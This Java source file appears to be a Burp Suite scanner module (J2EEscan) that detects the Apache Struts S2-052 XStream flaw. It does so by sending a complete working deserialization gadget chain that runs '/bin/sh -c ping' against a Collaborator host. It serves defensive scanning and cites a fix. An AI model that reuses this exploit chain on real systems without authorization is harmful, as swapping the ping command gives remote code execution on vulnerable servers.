package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.HTTPParser;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 * Apache Struts S2-052 REST Plugin XStream Remote Command Execution
 *
 * 
 * https://struts.apache.org/docs/s2-052.html
 * https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement
 * http://blog.csdn.net/caiqiiqi/article/details/77861477
 * 
 *
 */
public class ApacheStrutsS2052 implements IModule {

    private static final String TITLE = "Apache Struts S2-052 REST Plugin XStream Remote Command Execution";
    private static final String DESCRIPTION = "J2EEscan identified a potential remote command execution.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://struts.apache.org/docs/s2-052.html<br />"
            + "https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement<br />"
            + "http://blog.csdn.net/caiqiiqi/article/details/77861477";

    private static final String REMEDY = "Upgrade to Apache Struts version 2.5.13 or 2.3.34";


    private PrintWriter stderr;
    private PrintWriter stdout;

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();

        List<IScanIssue> issues = new ArrayList<>();

        if (!isJavaApplicationByURL(url)) {
            return issues;
        }

        String contentTypeHeader = HTTPParser.getRequestHeaderValue(reqInfo, "Content-type");
        
        if (contentTypeHeader == null){
            return issues;
        }
                
        
        // Change Content-Type header
        List<String> headers = reqInfo.getHeaders();        
        List<String> headersWithContentTypeXML = HTTPParser.addOrUpdateHeader(headers, "Content-type", "application/xml");
        
    
        // Collaborator context
        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);    
        
        // Payload to trigger remote ping
        String payload = " ping " + currentCollaboratorPayload;

        String xmlMarshallingBody= "<map>\n" +
            "  <entry>\n" +
            "    <jdk.nashorn.internal.objects.NativeString>\n" +
            "      <flags>0</flags>\n" +
            "      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n" +
            "        <dataHandler>\n" +
            "          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n" +
            "            <is class=\"javax.crypto.CipherInputStream\">\n" +
            "              <cipher class=\"javax.crypto.NullCipher\">\n" +
            "                <initialized>false</initialized>\n" +
            "                <opmode>0</opmode>\n" +
            "                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n" +
            "                  <iter class=\"javax.imageio.spi.FilterIterator\">\n" +
            "                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n" +
            "                    <next class=\"java.lang.ProcessBuilder\">\n" +
            "                      <command>\n" +
            "                        <string>/bin/sh</string><string>-c </string><string>" + payload + "</string>\n" +
            "                      </command>\n" +
            "                      <redirectErrorStream>false</redirectErrorStream>\n" +
            "                    </next>\n" +
            "                  </iter>\n" +
            "                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n" +
            "                    <method>\n" +
            "                      <class>java.lang.ProcessBuilder</class>\n" +
            "                      <name>start</name>\n" +
            "                      <parameter-types/>\n" +
            "                    </method>\n" +
            "                    <name>foo</name>\n" +
            "                  </filter>\n" +
            "                  <next class=\"string\">foo</next>\n" +
            "                </serviceIterator>\n" +
            "                <lock/>\n" +
            "              </cipher>\n" +
            "              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n" +
            "              <ibuffer/>\n" +
            "              <done>false</done>\n" +
            "              <ostart>0</ostart>\n" +
            "              <ofinish>0</ofinish>\n" +
            "              <closed>false</closed>\n" +
            "            </is>\n" +
            "            <consumed>false</consumed>\n" +
            "          </dataSource>\n" +
            "          <transferFlavors/>\n" +
            "        </dataHandler>\n" +
            "        <dataLen>0</dataLen>\n" +
            "      </value>\n" +
            "    </jdk.nashorn.internal.objects.NativeString>\n" +
            "    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n" +
            "  </entry>\n" +
            "  <entry>\n" +
            "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
            "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
            "  </entry>\n" +
            "</map>";
        
    
        
        //  Build request with serialization header
        byte[] message = helpers.buildHttpMessage(headersWithContentTypeXML, xmlMarshallingBody.getBytes());
        IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);

        
        // Poll Burp Collaborator for remote interaction
        List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

        if (!collaboratorInteractions.isEmpty()) {
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    reqInfo.getUrl(),
                    resp,
                    TITLE,
                    DESCRIPTION,
                    REMEDY,
                    Risk.High,
                    Confidence.Certain
            ));
        }

        return issues;
        
    }
}
